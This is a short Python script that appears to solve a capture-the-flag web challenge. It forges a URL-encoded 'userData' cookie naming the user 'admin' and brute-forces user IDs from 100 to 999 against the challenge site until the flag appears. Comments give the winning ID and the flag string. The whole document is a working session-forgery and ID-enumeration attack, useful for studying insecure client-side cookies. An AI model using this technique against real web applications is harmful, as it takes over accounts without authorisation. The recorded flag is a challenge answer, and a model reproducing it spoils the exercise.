#!/usr/bin/env python3

import requests

url = "https://message-board.hsc.tf/"

for i in range(100, 1000):
    print(i)
    my_cookie = {
        "userData": f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"
    }
    r = requests.get(url, cookies=my_cookie)
    if "no flag for you" not in r.text:
        print("ID", i)
        print(r.text)
        break

# 768
# flag{y4m_y4m_c00k13s}